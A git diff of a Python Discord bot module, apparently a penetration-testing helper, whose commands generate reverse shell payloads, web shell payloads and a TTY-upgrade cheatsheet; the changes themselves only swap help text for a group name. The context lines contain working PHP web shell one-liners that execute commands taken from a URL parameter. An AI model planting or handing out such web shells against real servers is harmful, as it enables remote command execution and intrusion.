@@ -11,7 +11,7 @@ class ReverseShellCog(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
 
-    @commands.command(help="Generate a payload for a reverse shell depending on the type of shell asked, using the specified IP and port.\n Usage: `!revsh <type> <ip> <port>`\n Types: `bash-i`, `bash196`, `readline`, `mkfifo`, `py1`, `py2`, `nc-e`, `nc-c`, `lua`")
+    @commands.command(group="RevShell")
     async def revsh(self, ctx, type: str, ip: str, port: int):
         """Generate a payload for a reverse shell depending on the type of shell asked, using the specified IP and port.
         
@@ -78,7 +78,7 @@ class ReverseShellCog(commands.Cog):
         logger.info(f" Sent {type} reverse shell to {ctx.author.name}\n")
         await ctx.send(embed=embed)
 
-    @commands.command(help="Generate a payload for a web shell depending on the type of shell asked \n Usage: `!websh <type>`\n Types: `php0`, `php-cmd`, `php-obf`, `asp`, `jsp`")
+    @commands.command(group="RevShell")
     async def websh(self, ctx, type: str):
         """Generate a payload for a web shell depending on the type of shell asked.
         
@@ -99,7 +99,6 @@ class ReverseShellCog(commands.Cog):
             case "php0":
                 payload = f"```php\n<?php system($_GET['cmd']); ?>```"
                 usage = "```http://target.com/shell.php?cmd=command```"
-
 
             case "php-cmd":
                 payload = f"```php\n<?=`$_GET[0]`?>```"
@@ -130,7 +129,7 @@ class ReverseShellCog(commands.Cog):
         await ctx.send(embed=embed)
 
 
-    @commands.command(help="Give a cheatsheet to establish a full interactive TTY session after achieving a reverse shell.\nUsage: !tty")
+    @commands.command(group="RevShell")
     async def tty(self, ctx):
         """Give a cheatsheet to establish a full interactive TTY session after achieving a reverse shell."""
         logger.info(f" TTY requested\nUser: {ctx.author.name}\nServer: {ctx.guild.name}\nChannel: {ctx.channel.name}\n")
